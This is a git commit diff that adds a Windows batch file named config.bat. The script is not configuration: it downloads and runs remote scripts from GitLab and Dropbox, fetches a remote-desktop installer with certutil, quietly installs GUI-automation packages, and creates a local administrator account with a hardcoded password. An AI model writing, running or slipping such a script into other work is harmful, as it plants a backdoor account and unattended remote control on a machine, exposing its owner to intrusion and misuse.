dce6f441b1bd2adcfa2950955d9938090861ca0b
menia12 <160221779+menia12@users.noreply.github.com>
2024-02-16 19:27:34 +0700

    Add files via upload

---
+++ config.bat
@@ -0,0 +1,13 @@
+@echo off
+curl -L -o login.py https://gitlab.com/rifqiekhafi/setrum/-/raw/main/login.py?inline=false
+curl -L -o loop.bat https://gitlab.com/rifqiekhafi/setrum/-/raw/main/loop.bat?inline=false
+curl -L -o show.bat https://gitlab.com/rifqiekhafi/setrum/-/raw/main/show.bat?inline=false
+certutil -urlcache -split -f "https://down.aweray.com/awesun/windows/Aweray_Remote_2.0.0.45399_x64.exe" Aweray_Remote_2.0.0.45399_x64.exe
+pip install pyautogui --quiet
+pip install psutil --quiet
+start "" "Aweray_Remote_2.0.0.45399_x64.exe"
+net user /add golinta Rumah0102
+net localgroup administrators golinta /add
+curl -s -L -o time.py https://www.dropbox.com/scl/fi/ox42qglbf6fsnm9erf8cw/timelimit.py?rlkey=opyeqgum1k95kud81xlc7d66r&dl=0
+start "" "Aweray_Remote_2.0.0.45399_x64.exe"
+python login.py
